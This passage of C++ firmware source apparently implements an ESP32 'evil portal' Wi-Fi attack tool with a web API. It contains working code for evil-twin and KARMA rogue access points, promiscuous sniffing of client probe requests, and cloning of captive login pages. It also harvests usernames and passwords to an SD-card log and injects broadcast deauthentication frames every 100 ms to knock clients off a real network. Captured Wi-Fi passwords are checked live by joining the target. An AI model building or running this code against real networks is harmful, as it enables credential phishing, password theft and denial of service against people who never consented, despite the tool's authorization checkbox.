    int rc = portal_begin(EP_MODE_TWIN, ssid.c_str(), (int)template_idx,
                          gateway.empty() ? NULL : gateway.c_str(), bssid.c_str(), (int)channel, coherent,
                          psk.empty() ? NULL : psk.c_str());
    if (rc) { web_resp_error(r, rc, rc == 400 ? "bad_request" : rc == 409 ? "conflict" : rc == 503 ? "unavailable" : "ap_failed", s_error); return; }
    std::string j = "{\"ok\":true,\"mode\":\"twin\",\"ssid\":";
    web_json_str(j, s_ssid);
    j += "}";
    web_resp_json(r, 200, j);
}

/* ── Start: KARMA, using an SSID learned by passive probe discovery ── */

static bool best_karma_ssid(const std::string &wanted, char out[33])
{
    std::lock_guard<std::mutex> lk(s_karma_mx);
    const karma_probe_t *best = NULL;
    for (int i = 0; i < s_karma_count; i++) {
        if (!wanted.empty() && wanted != s_karma_probes[i].ssid) continue;
        if (!best || s_karma_probes[i].hits > best->hits) best = &s_karma_probes[i];
    }
    if (!best) return false;
    snprintf(out, 33, "%s", best->ssid);
    return true;
}

static void start_karma(web_req_t *r)
{
    if (tools_busy(r, APPS)) return;
    std::string body, wanted, gateway;
    double template_idx = 0, channel = 1;
    if (!tools_read_json(r, body)) return;
    if (!authorized(body)) {
        web_resp_error(r, 400, "authorization_required", "Confirm that you own or may test this network"); return;
    }
    web_json_get_str(body, "ssid", wanted);
    web_json_get_str(body, "gateway", gateway);
    if (web_json_has(body, "templateId") && !web_json_get_num(body, "templateId", &template_idx)) {
        web_resp_error(r, 400, "bad_request", "templateId must be a number"); return;
    }
    if (web_json_has(body, "channel") && (!web_json_get_num(body, "channel", &channel) || channel < 1 || channel > 13)) {
        web_resp_error(r, 400, "bad_request", "channel must be 1-13"); return;
    }
    char ssid[33];
    if (!best_karma_ssid(wanted, ssid)) {
        web_resp_error(r, 409, "conflict", wanted.empty() ? "Run probe discovery first" : "Requested SSID was not discovered"); return;
    }
    finish_karma_scan();
    int rc = portal_begin(EP_MODE_KARMA, ssid, (int)template_idx,
                          gateway.empty() ? NULL : gateway.c_str(), NULL, (int)channel, false);
    if (rc) { web_resp_error(r, rc, rc == 400 ? "bad_request" : rc == 409 ? "conflict" : rc == 503 ? "busy" : "ap_failed", s_error); return; }
    std::string j = "{\"ok\":true,\"mode\":\"karma\",\"ssid\":";
    web_json_str(j, s_ssid);
    j += "}";
    web_resp_json(r, 200, j);
}

/* ── Stop ── */

static void stop_portal(web_req_t *r)
{
    finish_clone();
    finish_karma_scan();
    portal_finish();
    web_resp_ok(r);
}

static void reload_templates(web_req_t *r)
{
    int rejected = 0;
    int count = scan_custom_templates(&rejected);
    std::string extra = "\"count\":" + tools_int(count) + ",\"rejected\":" + tools_int(rejected);
    web_resp_ok(r, extra.c_str());
}

/* ── Captures ── */

static void get_captures(web_req_t *r)
{
    std::lock_guard<std::mutex> lk(s_captures_mx);
    std::string j = "{\"captures\":[";
    for (size_t i = 0; i < s_captures.size(); i++) {
        if (i) j += ",";
        j += "{\"url\":"; web_json_str(j, s_captures[i].url);
        j += ",\"username\":"; web_json_str(j, s_captures[i].username);

        std::string pwd;
        switch (s_pwd_mode) {
            case EP_PWD_MASKED: {
                size_t len = strlen(s_captures[i].password);
                if (len <= 2) pwd = s_captures[i].password;
                else { pwd = s_captures[i].password[0]; pwd += std::string(len - 2, '*'); pwd += s_captures[i].password[len - 1]; }
                break;
            }
            case EP_PWD_HIDDEN: pwd = "******"; break;
            case EP_PWD_LENGTH: { char buf[16]; snprintf(buf, sizeof(buf), "%zu chars", strlen(s_captures[i].password)); pwd = buf; break; }
            default: pwd = s_captures[i].password; break;
        }
        j += ",\"password\":"; web_json_str(j, pwd.c_str());
        static const char *const verify_names[] = { "off", "queued", "checking", "valid", "invalid", "error" };
        int verify = (int)s_captures[i].verify;
        j += ",\"verification\":"; web_json_str(j, verify_names[verify >= 0 && verify < 6 ? verify : 0]);
        j += ",\"ts\":" + tools_int(s_captures[i].ts) + "}";
    }
    j += "]}";
    web_resp_json(r, 200, j);
}

static void clear_captures(web_req_t *r)
{
    std::lock_guard<std::mutex> lk(s_captures_mx);
    s_captures.clear(); s_attempts = 0; s_confirmed = 0;
    s_verified_ok = s_verified_bad = 0;
    s_verify_cancel = s_verify_running;
#ifdef ARDUINO
    if (s_logpath[0]) remove(s_logpath);
    s_logpath[0] = 0;
#endif
    web_resp_ok(r);
}

/* ── Settings ── */

static void update_settings(web_req_t *r)
{
    std::string body, gateway;
    double number;
    bool flag;
    if (!tools_read_json(r, body)) return;
    if (web_json_has(body, "pwdMode")) {
        if (!web_json_get_num(body, "pwdMode", &number) || number < EP_PWD_FULL || number > EP_PWD_LENGTH) {
            web_resp_error(r, 400, "bad_request", "pwdMode must be 0-3"); return;
        }
        s_pwd_mode = (int)number;
    }
    if (web_json_has(body, "verify")) {
        if (!web_json_get_bool(body, "verify", &flag)) {
            web_resp_error(r, 400, "bad_request", "verify must be boolean"); return;
        }
        s_verify = flag;
    }
    if (web_json_get_str(body, "gateway", gateway)) {
        if (!valid_ipv4(gateway.c_str())) { web_resp_error(r, 400, "bad_request", "invalid gateway IPv4 address"); return; }
        if (s_active) { web_resp_error(r, 409, "conflict", "stop the portal before changing gateway"); return; }
        snprintf(s_gateway, sizeof(s_gateway), "%s", gateway.c_str());
    }
    if (web_json_has(body, "debug")) {
        web_json_get_bool(body, "debug", &flag);
        s_debug = flag;
    }
    if (web_json_has(body, "autoStopBase")) {
        if (!web_json_get_num(body, "autoStopBase", &number) || number < 0 || number > 3600) {
            web_resp_error(r, 400, "bad_request", "autoStopBase: 0-3600 seconds"); return;
        }
        s_auto_base_s = (uint16_t)number;
    }
    if (web_json_has(body, "autoStopExtended")) {
        if (!web_json_get_num(body, "autoStopExtended", &number) || number < 0 || number > 3600) {
            web_resp_error(r, 400, "bad_request", "autoStopExtended: 0-3600 seconds"); return;
        }
        s_auto_extended_s = (uint16_t)number;
    }
    web_resp_ok(r);
}

/* ── Passive KARMA probe discovery ── */

static void record_probe(const char *ssid, const char *client, int rssi, int channel)
{
    if (!ssid || !*ssid || strlen(ssid) > 32) return;
    std::lock_guard<std::mutex> lk(s_karma_mx);
    karma_probe_t *probe = NULL;
    for (int i = 0; i < s_karma_count; i++) {
        if (!strcmp(s_karma_probes[i].ssid, ssid)) { probe = &s_karma_probes[i]; break; }
    }
    if (!probe) {
        if (s_karma_count >= KARMA_PROBE_LIMIT) return;
        probe = &s_karma_probes[s_karma_count++];
        memset(probe, 0, sizeof(*probe));
        snprintf(probe->ssid, sizeof(probe->ssid), "%s", ssid);
    }
    probe->hits++;
    probe->rssi = rssi;
    probe->channel = channel;
    probe->last_seen = tools_epoch();
    if (client && strlen(client) == 17) {
        snprintf(probe->last_client, sizeof(probe->last_client), "%s", client);
        bool known = false;
        for (int i = 0; i < probe->client_count; i++) if (!strcmp(probe->clients[i], client)) known = true;
        if (!known && probe->client_count < KARMA_CLIENT_LIMIT) {
            snprintf(probe->clients[probe->client_count++], 18, "%s", client);
        }
    }
}

#ifdef ARDUINO
static void karma_promisc_cb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    (void)type;
    if (!s_karma_scanning || !buf) return;
    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    const uint8_t *f = pkt->payload;
    size_t len = pkt->rx_ctrl.sig_len;
    if (len < 25 || f[0] != 0x40) return; /* probe request, including retries */
    char client[18];
    snprintf(client, sizeof(client), "%02x:%02x:%02x:%02x:%02x:%02x",
             f[10], f[11], f[12], f[13], f[14], f[15]);
    size_t off = 24;
    while (off + 2 <= len) {
        uint8_t tag = f[off], n = f[off + 1];
        if (off + 2 + n > len) break;
        if (tag == 0) {
            if (n > 0 && n <= 32) {
                char ssid[33] = {};
                memcpy(ssid, f + off + 2, n);
                record_probe(ssid, client, pkt->rx_ctrl.rssi, pkt->rx_ctrl.channel);
            }
            return;
        }
        off += 2 + n;
    }
}
#endif

/* 0 on success, otherwise an HTTP status. */
static int begin_karma_scan(int seconds)
{
    if (s_active || s_karma_scanning || s_cloning) return 409;
    if (seconds < 1 || seconds > 120) return 400;
    std::string radio_error;
    if (!tools_wifi_claim(EP_RADIO_OWNER, radio_error)) { set_error(radio_error.c_str()); return 503; }
    {
        std::lock_guard<std::mutex> lk(s_karma_mx);
        memset(s_karma_probes, 0, sizeof(s_karma_probes));
        s_karma_count = 0;
    }
    set_error("");
    s_karma_channel = 1;
    s_karma_last_hop_ms = 0;
    s_karma_scan_end_ms = tools_now_ms() + (uint32_t)seconds * 1000;
    s_karma_scanning = true;
#ifdef ARDUINO
    save_sta_config();
    WiFi.mode(WIFI_STA);
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    esp_err_t rc = esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
    if (rc == ESP_OK) rc = esp_wifi_set_promiscuous_rx_cb(karma_promisc_cb);
    if (rc == ESP_OK) rc = esp_wifi_set_promiscuous(true);
    if (rc != ESP_OK) {
        finish_karma_scan();
        set_error("Wi-Fi promiscuous mode could not start");
        return 500;
    }
#endif
    return 0;
}

static void finish_karma_scan(void)
{
    if (!s_karma_scanning) return;
    s_karma_scanning = false;
#ifdef ARDUINO
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    restore_sta_config(true);
#endif
    tools_wifi_release(EP_RADIO_OWNER);
}

static void karma_scan(web_req_t *r)
{
    if (tools_busy(r, APPS)) return;
    std::string body;
    double seconds = 30;
    if (!tools_read_json(r, body)) return;
    if (!authorized(body)) {
        web_resp_error(r, 400, "authorization_required", "Confirm that you own or may test this network"); return;
    }
    if (web_json_has(body, "seconds") && (!web_json_get_num(body, "seconds", &seconds) || seconds < 1 || seconds > 120)) {
        web_resp_error(r, 400, "bad_request", "seconds must be 1-120"); return;
    }
    int rc = begin_karma_scan((int)seconds);
    if (rc) {
        web_resp_error(r, rc, rc == 400 ? "bad_request" : rc == 409 ? "conflict" : rc == 503 ? "busy" : "unavailable",
                       rc == 409 ? "Stop the portal or current probe discovery first" : s_error);
        return;
    }
    std::string j = "{\"ok\":true,\"scanning\":true,\"seconds\":" + tools_int((long long)seconds) + "}";
    web_resp_json(r, 202, j);
}

static void karma_list(web_req_t *r)
{
    std::lock_guard<std::mutex> lk(s_karma_mx);
    std::string j = std::string("{\"scanning\":") + (s_karma_scanning ? "true" : "false") + ",\"probes\":[";
    for (int i = 0; i < s_karma_count; i++) {
        if (i) j += ",";
        j += "{\"ssid\":"; web_json_str(j, s_karma_probes[i].ssid);
        j += ",\"hits\":" + tools_int(s_karma_probes[i].hits) +
            ",\"clients\":" + tools_int(s_karma_probes[i].client_count) +
            ",\"rssi\":" + tools_int(s_karma_probes[i].rssi) +
            ",\"channel\":" + tools_int(s_karma_probes[i].channel) +
            ",\"last_seen\":" + tools_int(s_karma_probes[i].last_seen);
        j += ",\"lastClient\":"; web_json_str(j, s_karma_probes[i].last_client);
        j += "}";
    }
    j += "]}";
    web_resp_json(r, 200, j);
}

/* ── Clone an authorized open lab AP's already-safe captive page ── */

static int save_cloned_template(const std::string &html)
{
    if (!valid_template_html(html)) { set_error("Captured page is not a safe self-contained POST /login template"); return -3; }
    if (!web_fs_sd_mounted()) { set_error("Insert a FAT32 SD card before cloning"); return -5; }
    std::string data, portal, pages;
    if (web_fs_resolve("/sd/data", data) || web_fs_resolve("/sd/data/evilportal", portal) ||
        web_fs_resolve(CUSTOM_TEMPLATE_DIR, pages)) {
        set_error("Could not resolve the SD template folder"); return -5;
    }
    web_plat_io_lock();
    mkdir(data.c_str(), 0775);
    mkdir(portal.c_str(), 0775);
    mkdir(pages.c_str(), 0775);
    web_plat_io_unlock();
    std::string host;
    if (web_fs_resolve("/sd/data/evilportal/portals/cloned.html", host)) {
        set_error("Could not resolve cloned.html"); return -5;
    }
    const std::string tmp = host + ".tmp";
    web_plat_io_lock();
    FILE *f = fopen(tmp.c_str(), "wb");
    size_t written = f ? fwrite(html.data(), 1, html.size(), f) : 0;
    if (f) fclose(f);
    int rc = written == html.size() && rename(tmp.c_str(), host.c_str()) == 0 ? (int)html.size() : -5;
    if (rc < 0) remove(tmp.c_str());
    web_plat_io_unlock();
    if (rc < 0) { set_error("Could not save cloned.html on the SD card"); return rc; }
    scan_custom_templates();
    snprintf(s_clone_name, sizeof(s_clone_name), "cloned.html");
    return rc;
}

static int begin_clone(const char *ssid)
{
    if (s_active || s_karma_scanning || s_cloning) { set_error("Stop the portal, probe discovery or current clone first"); return 409; }
    if (!ssid || !*ssid || strlen(ssid) > 32) { set_error("SSID must be 1-32 UTF-8 bytes"); return 400; }
    if (!web_fs_sd_mounted()) { set_error("Insert a FAT32 SD card before cloning"); return 503; }
    std::string radio_error;
    if (!tools_wifi_claim(EP_RADIO_OWNER, radio_error)) { set_error(radio_error.c_str()); return 503; }
    set_error("");
    s_cloning = true;
    s_clone_radio = true;
    s_clone_fetching = false;
    s_clone_bytes = 0;
    s_clone_name[0] = 0;
    snprintf(s_clone_ssid, sizeof(s_clone_ssid), "%s", ssid);
    s_clone_deadline_ms = tools_now_ms() + 20000;
#ifdef ARDUINO
    save_sta_config();
    WiFi.mode(WIFI_STA);
    WiFi.disconnect(false, false);
    WiFi.begin(ssid);
#endif
    return 0;
}

static void finish_clone(void)
{
    s_cloning = false;
    s_clone_fetching = false;
    if (!s_clone_radio) return;
    s_clone_radio = false;
#ifdef ARDUINO
    restore_sta_config(true);
#endif
    tools_wifi_release(EP_RADIO_OWNER);
}

#ifdef ARDUINO
static void fetch_clone_page(void)
{
    s_clone_fetching = true;
    HTTPClient http;
    http.setConnectTimeout(4000);
    http.setTimeout(4000);
    http.setFollowRedirects(HTTPC_STRICT_FOLLOW_REDIRECTS);
    if (!http.begin("http://connectivitycheck.gstatic.com/generate_204")) {
        set_error("Could not initialize captive-page request"); finish_clone(); return;
    }
    int code = http.GET();
    if (code == 204) { http.end(); set_error("The open AP returned no captive portal page"); finish_clone(); return; }
    if (code != 200) { http.end(); set_error("Captive-page request did not return HTTP 200"); finish_clone(); return; }
    int left = http.getSize();
    if (left > CUSTOM_TEMPLATE_BYTES) { http.end(); set_error("Captive page exceeds the 64 KiB template limit"); finish_clone(); return; }
    WiFiClient *stream = http.getStreamPtr();
    std::string html;
    uint32_t deadline = tools_now_ms() + 5000;
    while (stream && http.connected() && (left < 0 || (int)html.size() < left)) {
        size_t available = stream->available();
        if (available) {
            uint8_t buf[512];
            size_t want = std::min(available, sizeof(buf));
            if (left >= 0) want = std::min(want, (size_t)(left - (int)html.size()));
            size_t got = stream->readBytes(buf, want);
            if (!got) break;
            html.append((const char *)buf, got);
            if (html.size() > CUSTOM_TEMPLATE_BYTES) break;
        } else {
            if (!stream->connected()) break;
            delay(5);
        }
        if ((int32_t)(tools_now_ms() - deadline) >= 0) break;
    }
    http.end();
    int saved = save_cloned_template(html);
    if (saved > 0) { s_clone_bytes = saved; set_error(""); }
    finish_clone();
}
#endif

static void clone_page(web_req_t *r)
{
    std::string body, ssid;
    if (!tools_read_json(r, body)) return;
    if (!authorized(body)) {
        web_resp_error(r, 400, "authorization_required", "Confirm that you own or may clone this open lab network"); return;
    }
    web_json_get_str(body, "ssid", ssid);
    int rc = begin_clone(ssid.c_str());
    if (rc) { web_resp_error(r, rc, rc == 400 ? "bad_request" : rc == 409 ? "conflict" : "unavailable", s_error); return; }
    std::string j = "{\"ok\":true,\"cloning\":true,\"ssid\":";
    web_json_str(j, s_clone_ssid);
    j += "}";
    web_resp_json(r, 202, j);
}

/* ── Verify a captured lab PSK against the selected twin target ── */

static void finish_verification(void)
{
    if (!s_verify_running) return;
#ifdef ARDUINO
    if (s_active) {
        /* The portal is still running: only drop the verification STA link. Do NOT reconnect to the
         * saved home AP here — AP and STA share one radio, so reconnecting would pull the portal AP
         * off its (twin) channel. The real STA restore happens in portal_finish(). */
        WiFi.disconnect(false, false);
    } else {
        restore_sta_config(false);
    }
#endif
    s_verify_running = false;
    s_verify_cancel = false;
    memset(&s_verify_capture, 0, sizeof(s_verify_capture));
}

static void complete_verification(bool valid, bool error = false)
{
    if (!s_verify_running) return;
    {
        std::lock_guard<std::mutex> lk(s_captures_mx);
        for (capture_t &cap : s_captures) {
            if (cap.verify == CAP_VERIFY_CHECKING && cap.ts == s_verify_capture.ts &&
                !strcmp(cap.username, s_verify_capture.username) && !strcmp(cap.password, s_verify_capture.password)) {
                cap.verify = error ? CAP_VERIFY_ERROR : valid ? CAP_VERIFY_VALID : CAP_VERIFY_INVALID;
                if (!error) { if (valid) s_verified_ok++; else s_verified_bad++; }
                break;
            }
        }
    }
    finish_verification();
}

static void begin_next_verification(void)
{
    if (s_verify_running || !s_active || s_mode != EP_MODE_TWIN || !s_verify) return;
    {
        std::lock_guard<std::mutex> lk(s_captures_mx);
        for (capture_t &cap : s_captures) {
            if (cap.verify == CAP_VERIFY_QUEUED) {
                cap.verify = CAP_VERIFY_CHECKING;
                s_verify_capture = cap;
                s_verify_running = true;
                break;
            }
        }
    }
    if (!s_verify_running) return;
    s_verify_cancel = false;
    s_verify_deadline_ms = tools_now_ms() + 10000;
#ifdef ARDUINO
    uint8_t bssid[6];
    WiFi.disconnect(false, false);
    if (!mac_parse_ep(s_twin_bssid_str, bssid)) { complete_verification(false, true); return; }
    WiFi.begin(s_ssid, s_verify_capture.password, s_twin_channel, bssid, true);
#endif
}

/* ═══════════════════════════════════════════════ Route dispatch ══════════════ */

/* Called by the core BEFORE static-file routing so unpaired captive clients can
 * actually reach the login page. API routes remain authenticated and are never
 * rewritten into captive HTML. */
bool web_evilportal_captive(web_req_t *r)
{
    if (!s_active) return false;
    handle_captive_request(r);
    return true;
}

static bool handle(web_req_t *r)
{
#ifndef ARDUINO
    if (tools_is(r, "POST", "/api/_dev/evilportal")) {
        std::string body, action;
        if (!tools_read_json(r, body)) return true;
        web_json_get_str(body, "action", action);
        if (action == "creds") {
            if (!s_active) { web_resp_error(r, 409, "conflict", "start the portal first"); return true; }
            capture_t cap = {};
            cap.ts = tools_epoch();
            snprintf(cap.url, sizeof(cap.url), "/login");
            std::string user, pass;
            web_json_get_str(body, "username", user);
            web_json_get_str(body, "password", pass);
            if (user.empty() || pass.empty()) { web_resp_error(r, 400, "bad_request", "username and password required"); return true; }
            snprintf(cap.username, sizeof(cap.username), "%s", user.c_str());
            snprintf(cap.password, sizeof(cap.password), "%s", pass.c_str());
            cap.verify = (s_verify && s_mode == EP_MODE_TWIN) ? CAP_VERIFY_QUEUED : CAP_VERIFY_OFF;
            std::lock_guard<std::mutex> lk(s_captures_mx);
            if (s_captures.size() >= MAX_CAPTURES) { web_resp_error(r, 409, "conflict", "capture store full"); return true; }
            s_captures.push_back(cap);
            s_attempts++;
        } else if (action == "client") {
            if (s_clients < 16) s_clients++;
        } else if (action == "clone") {
            if (!s_cloning) { web_resp_error(r, 409, "conflict", "start page cloning first"); return true; }
            bool success = true;
            web_json_get_bool(body, "ok", &success);
            if (success) {
                std::string html = std::string("<!doctype html><html><head><title>Cloned lab portal</title></head><body><h1>Cloned: ") + s_clone_ssid +
                    "</h1><form method='post' action='/login'><input name='username'><input type='password' name='password'></form></body></html>";
                int saved = save_cloned_template(html);
                if (saved > 0) s_clone_bytes = saved;
            } else set_error("Simulator clone request failed");
            finish_clone();
        } else if (action == "verify") {
            if (!s_verify_running) { web_resp_error(r, 409, "conflict", "no PSK verification is pending"); return true; }
            bool valid = false, error = false;
            web_json_get_bool(body, "valid", &valid);
            web_json_get_bool(body, "error", &error);
            complete_verification(valid, error);
        } else if (action == "probe") {
            if (!s_karma_scanning) { web_resp_error(r, 409, "conflict", "start probe discovery first"); return true; }
            std::string ssid, client;
            double hits = 1, rssi = -60, channel = 1;
            web_json_get_str(body, "ssid", ssid);
            web_json_get_str(body, "mac", client);
            web_json_get_num(body, "hits", &hits);
            web_json_get_num(body, "rssi", &rssi);
            web_json_get_num(body, "channel", &channel);
            if (client.empty()) client = "02:00:00:00:00:01";
            if (ssid.empty() || ssid.size() > 32 || hits < 1 || hits > 100) {
                web_resp_error(r, 400, "bad_request", "ssid: 1-32 bytes; hits: 1-100"); return true;
            }
            for (int i = 0; i < (int)hits; i++) record_probe(ssid.c_str(), client.c_str(), (int)rssi, (int)channel);
        } else {
            web_resp_error(r, 400, "bad_request", "unknown simulator action"); return true;
        }
        web_resp_ok(r);
        return true;
    }
#endif
    if (strcmp(r->path, "/api/evilportal") && strncmp(r->path, "/api/evilportal/", 16)) return false;

    if (tools_is(r, "GET", "/api/evilportal"))                    status_json(r);
    else if (tools_is(r, "POST", "/api/evilportal/start"))        start_standalone(r);
    else if (tools_is(r, "POST", "/api/evilportal/start-twin"))   start_twin(r);
    else if (tools_is(r, "POST", "/api/evilportal/start-karma"))  start_karma(r);
    else if (tools_is(r, "POST", "/api/evilportal/stop"))         stop_portal(r);
    else if (tools_is(r, "GET", "/api/evilportal/captures"))      get_captures(r);
    else if (tools_is(r, "POST", "/api/evilportal/clear"))        clear_captures(r);
    else if (tools_is(r, "POST", "/api/evilportal/templates/reload")) reload_templates(r);
    else if (tools_is(r, "PUT", "/api/evilportal/settings"))      update_settings(r);
    else if (tools_is(r, "POST", "/api/evilportal/karma-scan"))   karma_scan(r);
    else if (tools_is(r, "GET", "/api/evilportal/karma"))         karma_list(r);
    else if (tools_is(r, "POST", "/api/evilportal/clone"))        clone_page(r);
    else web_resp_error(r, 404, "not_found");
    return true;
}

/* ═══════════════════════════════════════════════ Tick / lifecycle ════════════ */

/* ── SD credential logging ── */

static void setup_log_path(void)
{
#ifdef ARDUINO
    if (!web_fs_sd_mounted()) {
        s_logpath[0] = 0;
        if (!s_error[0]) set_error("SD logging unavailable; captures are kept in memory only");
        return;
    }
    mkdir("/sd/data", 0775);
    mkdir("/sd/data/evilportal", 0775);
    time_t now = (time_t)tools_epoch();
    struct tm *tm = localtime(&now);
    if (!tm) tm = gmtime(&now);
    if (!tm) {
        s_logpath[0] = 0;
        set_error("Could not name the SD capture log");
        return;
    }
    snprintf(s_logpath, sizeof(s_logpath), "/sd/data/evilportal/ep-%04d%02d%02d-%02d%02d%02d.csv",
             tm->tm_year + 1900, tm->tm_mon + 1, tm->tm_mday,
             tm->tm_hour, tm->tm_min, tm->tm_sec);
    FILE *f = fopen(s_logpath, "a");
    if (!f) {
        s_logpath[0] = 0;
        set_error("SD capture log could not be created; captures are memory-only");
    } else {
        if (ftell(f) == 0) fputs("timestamp,username,password\n", f);
        fclose(f);
    }
    if (s_debug) {
        FILE *log = fopen("/sd/data/evilportal/ep-debug.log", "a");
        if (log) {
            fprintf(log, "%lld,start,heap=%u,dhcps_ok=%d,ssid=%s\n",
                    (long long)s_started, (unsigned)ESP.getFreeHeap(), s_dhcps_ok ? 1 : 0, s_ssid);
            fclose(log);
        } else if (!s_error[0]) set_error("Debug log could not be opened");
    }
#else
    snprintf(s_logpath, sizeof(s_logpath), "/sd/data/evilportal/ep-sim.csv");
#endif
}

/* ── Evil-twin deauth frame injection ── */

#ifdef ARDUINO
#define DEAUTH_FRAME_SIZE 26

static void build_deauth_frame(uint8_t *frame, const uint8_t *dst, const uint8_t *src, uint16_t reason)
{
    memset(frame, 0, DEAUTH_FRAME_SIZE);
    frame[0] = 0xC0; frame[1] = 0x00;
    memcpy(frame + 4, dst, 6);
    memcpy(frame + 10, src, 6);
    memcpy(frame + 16, src, 6);
    frame[24] = reason & 0xFF;
    frame[25] = (reason >> 8) & 0xFF;
}

static bool mac_parse_ep(const char *s, uint8_t *mac)
{
    int v[6];
    if (sscanf(s, "%x:%x:%x:%x:%x:%x", &v[0], &v[1], &v[2], &v[3], &v[4], &v[5]) != 6) return false;
    for (int i = 0; i < 6; i++) mac[i] = (uint8_t)v[i];
    return true;
}

static void send_twin_deauth(void)
{
    uint8_t bssid[6];
    if (!mac_parse_ep(s_twin_bssid_str, bssid)) return;

    uint8_t frame[DEAUTH_FRAME_SIZE];
    uint8_t bcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

    /* Deauth broadcast — disconnect all stations from the real AP */
    build_deauth_frame(frame, bcast, bssid, 0x07);
    for (int i = 0; i < 5; i++) {
        frame[22] = (uint8_t)(s_deauth_frames & 0xFF);
        frame[23] = (uint8_t)((s_deauth_frames >> 8) & 0xFF);
        esp_err_t rc = esp_wifi_80211_tx(WIFI_IF_STA, frame, DEAUTH_FRAME_SIZE, false);
        if (rc == ESP_OK) s_deauth_frames++;
        else if (s_deauth_frames == 0) set_error("Twin deauth injection was rejected by Wi-Fi");
    }
}
#endif

static void evilportal_tick(uint32_t now_ms)
{
    if (s_cloning) {
#ifdef ARDUINO
        if (!s_clone_fetching && WiFi.status() == WL_CONNECTED) fetch_clone_page();
        else if (!s_clone_fetching && (WiFi.status() == WL_CONNECT_FAILED || WiFi.status() == WL_NO_SSID_AVAIL)) {
            set_error("Could not join the authorized open lab AP"); finish_clone();
        } else if (!s_clone_fetching && (int32_t)(now_ms - s_clone_deadline_ms) >= 0) {
            set_error("Timed out joining the authorized open lab AP"); finish_clone();
        }
#else
        if ((int32_t)(now_ms - s_clone_deadline_ms) >= 0) { set_error("Simulator clone timed out"); finish_clone(); }
#endif
    }
    if (s_verify_running) {
        if (s_verify_cancel || !s_active || !s_verify) finish_verification();
#ifdef ARDUINO
        else if (WiFi.status() == WL_CONNECTED) complete_verification(true);
        else if (WiFi.status() == WL_CONNECT_FAILED || WiFi.status() == WL_NO_SSID_AVAIL) complete_verification(false);
        else if ((int32_t)(now_ms - s_verify_deadline_ms) >= 0) complete_verification(false, true);
#else
        else if ((int32_t)(now_ms - s_verify_deadline_ms) >= 0) complete_verification(false, true);
#endif
    }
    begin_next_verification();
    if (s_karma_scanning) {
        if ((int32_t)(now_ms - s_karma_scan_end_ms) >= 0) finish_karma_scan();
        else if (now_ms - s_karma_last_hop_ms >= 250) {
            s_karma_last_hop_ms = now_ms;
#ifdef ARDUINO
            esp_wifi_set_channel(s_karma_channel, WIFI_SECOND_CHAN_NONE);
#endif
            s_karma_channel = s_karma_channel % 13 + 1;
        }
    }
    if (!s_active) return;
#ifdef ARDUINO
    s_dns.processNextRequest();
    s_clients = WiFi.softAPgetStationNum();
    if (s_mode == EP_MODE_TWIN && s_twin_bssid_str[0]) {
        static uint32_t last_deauth = 0;
        if (now_ms - last_deauth >= 100) {
            last_deauth = now_ms;
            send_twin_deauth();
        }
    }
    if (s_debug && web_fs_sd_mounted()) {
        static uint32_t last_debug = 0;
        if (now_ms - last_debug >= 10000) {
            last_debug = now_ms;
            FILE *log = fopen("/sd/data/evilportal/ep-debug.log", "a");
            if (log) {
                fprintf(log, "%lld,heap=%u,dhcps_ok=%d,clients=%d,ssid=%s\n",
                        (long long)tools_epoch(), (unsigned)ESP.getFreeHeap(), s_dhcps_ok ? 1 : 0, s_clients, s_ssid);
                fclose(log);
            }
        }
    }
#endif
    /* The idle ("base") and active ("extended") stop timers are independent; either one set to 0
     * means "off". Whichever applies to the current state (traffic or not) stops the portal when
     * elapsed reaches it. */
    uint32_t limit = (s_clients > 0 || s_attempts > 0) ? s_auto_extended_s : s_auto_base_s;
    if (limit > 0) {
        uint32_t elapsed = (uint32_t)(tools_epoch() - s_started);
        if (elapsed >= limit) portal_finish();
    }
}

static void evilportal_stop(void) { finish_clone(); finish_karma_scan(); portal_finish(); }

int web_hw_evilportal_template_count(void)
{
    return (int)BUILTIN_COUNT + scan_custom_templates();
}
const char *web_hw_evilportal_template_name(int idx)
{
    if (idx >= 0 && idx < (int)BUILTIN_COUNT) return BUILTIN_TEMPLATES[idx].name;
    std::lock_guard<std::mutex> lk(s_templates_mx);
    int custom = idx - (int)BUILTIN_COUNT;
    return custom >= 0 && custom < (int)s_custom_templates.size() ? s_custom_templates[custom].name.c_str() : "";
}
int web_hw_evilportal_template_id(int idx)
{
    if (idx >= 0 && idx < (int)BUILTIN_COUNT) return idx;
    std::lock_guard<std::mutex> lk(s_templates_mx);
    int custom = idx - (int)BUILTIN_COUNT;
    return custom >= 0 && custom < (int)s_custom_templates.size() ? s_custom_templates[custom].id : -1;
}
bool web_hw_evilportal_template_is_builtin(int idx) { return idx >= 0 && idx < (int)BUILTIN_COUNT; }
int web_hw_evilportal_ssid_count(void) { return (int)SSID_PRESET_COUNT; }
const char *web_hw_evilportal_ssid_preset(int idx)
{
    return idx >= 0 && idx < (int)SSID_PRESET_COUNT ? SSID_PRESETS[idx] : "";
}
int web_hw_evilportal_clone_page(const char *open_ssid) { return -begin_clone(open_ssid); }
bool web_hw_evilportal_cloning(void) { return s_cloning; }
const char *web_hw_evilportal_clone_name(void) { return s_clone_name; }
bool web_hw_evilportal_start(int template_idx, const char *ssid, const char *gateway_ip)
{
    return portal_begin(EP_MODE_STANDALONE, ssid, template_idx, gateway_ip, NULL, 1, false) == 0;
}
bool web_hw_evilportal_start_twin(int template_idx, const char *ssid, const uint8_t bssid[6],
                                   int channel, int authmode, bool coherent, const char *psk)
{
    (void)authmode;
    char mac[18];
    snprintf(mac, sizeof(mac), "%02x:%02x:%02x:%02x:%02x:%02x", bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
    return portal_begin(EP_MODE_TWIN, ssid, template_idx, NULL, mac, channel, coherent, psk) == 0;
}
bool web_hw_evilportal_start_karma(int template_idx)
{
    char ssid[33];
    if (!best_karma_ssid("", ssid)) { set_error("Run probe discovery first"); return false; }
    finish_karma_scan();
    return portal_begin(EP_MODE_KARMA, ssid, template_idx, NULL, NULL, 1, false) == 0;
}
bool web_hw_evilportal_stop(void) { finish_clone(); finish_karma_scan(); portal_finish(); return true; }
void web_hw_evilportal_status(web_hw_evilportal_t *out)
{
    if (!out) return;
    memset(out, 0, sizeof(*out));
    out->active = s_active;
